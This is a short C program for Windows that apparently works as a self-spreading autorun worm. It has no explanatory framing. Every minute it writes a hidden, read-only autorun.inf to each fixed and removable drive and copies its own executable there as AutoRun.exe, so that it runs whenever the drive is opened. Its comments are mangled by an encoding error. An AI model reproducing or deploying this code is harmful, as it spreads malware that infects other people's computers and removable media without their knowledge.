#include <windows.h>
#include <stdio.h>
//¥≈≈Ã∏–»æ
void WriteIni(char* path)
{
 
	char inifilePath[MAX_PATH];
	strcpy(inifilePath,path);
	strcat(inifilePath,"\\autorun.inf");
	WritePrivateProfileString("AutoRun","open","AutoRun.exe",inifilePath);//–¥»ÎINI
	WritePrivateProfileString("AutoRun","shell\\open","Open(&0)",inifilePath);//–¥»ÎINI
	WritePrivateProfileString("AutoRun","shell\\open\\Command","AutoRun.exe",inifilePath);
 
	SetFileAttributes(inifilePath,FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_HIDDEN);
 
}
void InjectAllDisk()
{
 
	for(char i='A';i<'Z';i++)
	{
 
		char x[20]={i,':'};
		UINT type=GetDriveType(x);
		if(type==DRIVE_FIXED||type==DRIVE_REMOVABLE)
		{
 
			printf("InjectAllDisk\n");
			WriteIni(x);
			char virusPath[MAX_PATH];
			char currentPath[MAX_PATH];
			GetModuleFileName(NULL,currentPath,MAX_PATH);
			sprintf(virusPath,"%s%s",x,"\\AutoRun.exe");
			CopyFile(currentPath,virusPath,TRUE);
			SetFileAttributes(virusPath,FILE_ATTRIBUTE_READONLY|FILE_ATTRIBUTE_READONLY);
 
		}
 
	}
}
DWORD WINAPI StartInject(LPVOID lparam)
{
	char szCmd[MAX_PATH];
	char path[MAX_PATH];
	GetModuleFileName(NULL,path,MAX_PATH);
	path[2]='\0';
	sprintf(szCmd,"explorer %s",path);
	WinExec(szCmd,SW_SHOW);
	while(TRUE)
	{
 
		InjectAllDisk();
		Sleep(1000*60);
	}
	return 0;
 
 
}
int main(int argc,char*argv[])
{
 
	HANDLE Thread=CreateThread(NULL,NULL,StartInject,NULL,NULL,NULL);
	WaitForSingleObject(Thread,INFINITE);
 
	return 0;
}
